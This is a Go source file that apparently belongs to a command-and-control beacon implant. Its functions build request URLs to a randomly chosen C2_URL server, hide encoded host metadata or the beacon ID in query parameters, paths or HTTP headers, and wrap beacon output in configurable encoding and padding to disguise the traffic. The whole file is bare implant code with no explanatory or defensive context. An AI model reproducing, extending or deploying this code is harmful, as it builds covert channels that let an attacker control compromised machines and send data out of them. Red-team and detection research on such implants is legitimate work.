package core

import (
	"net/url"
	"strconv"
	"strings"
)

func GetURL(Map map[string]interface{}) string {
	Addr   := SplitX(C2_URL, ',', ' ')
	Path   := SplitX(Map["Path"].(string), ',', ' ')
	URL, _ := url.Parse(Addr[RandInt(0, len(Addr))] + Path[RandInt(0, len(Path))])
	URL.RawQuery = strings.TrimPrefix(Map["Query"].(string), "?")
	Info, Data := GetPadding(Map)
	if strings.ToUpper(Info[0]) == "URL" {
		if len(Info) == 2 && len(Info[1]) > 0 {
			Query := URL.Query()
			Query.Set(Info[1], Data)
			URL.RawQuery = Query.Encode()
		} else {
			URL.Path = URL.Path + Data
		}
	}
	return URL.String()
}

func GetHeader(Map map[string]interface{}) map[string]string {
	if Value, OK := Map["Header"].(string); OK {
		NewMap := map[string]string{}
		for _, v := range strings.Split(string(Decoding("Base64", Value)), "\n") {
			if !strings.Contains(v, ":") { continue }
			Arr := strings.SplitN(v, ":", 2)
			Key := strings.TrimSpace(Arr[0])
			Val := strings.TrimSpace(Arr[1])
			NewMap[Key] = Val
		}
		Map["Header"] = NewMap
	}
	Header := Map["Header"].(map[string]string)
	Info, Data := GetPadding(Map)
	if strings.ToUpper(Info[0]) == "HEADER" {
		Header[Info[1]] = Data
	}
	return Header
}

func GetOutput(Bytes []byte) []byte {
	Info := PullInfo["Output"].(map[string]string)
	Data := Bytes[ToLength(Info["Prepend"]):len(Bytes)-ToLength(Info["Append"])]
	return Decoding(Info["Coding"], string(Data))
}

func SetOutput(Bytes []byte) *strings.Reader {
	Info := PushInfo["Output"].(map[string]string)
	Data := Info["Prepend"] + Encoding(Info["Coding"], Bytes) + Info["Append"]
	return strings.NewReader(Data)
}

func GetPadding(Map map[string]interface{}) ([]string, string) {
	var KeyVal string;
	var KeyMap map[string]string;
	if Value, OK := Map["MetaData"]; OK {
		KeyMap = Value.(map[string]string)
		KeyVal = Encoding(KeyMap["Coding"], MetaByte)
	}
	if Value, OK := Map["BeaconID"]; OK {
		KeyMap = Value.(map[string]string)
		KeyVal = Encoding(KeyMap["Coding"], []byte(strconv.Itoa(BeaconID)))
	}
	Info := strings.SplitN(KeyMap["Store"], ":", 2)
	Data := KeyMap["Prepend"] + KeyVal + KeyMap["Append"]
	return Info, Data
}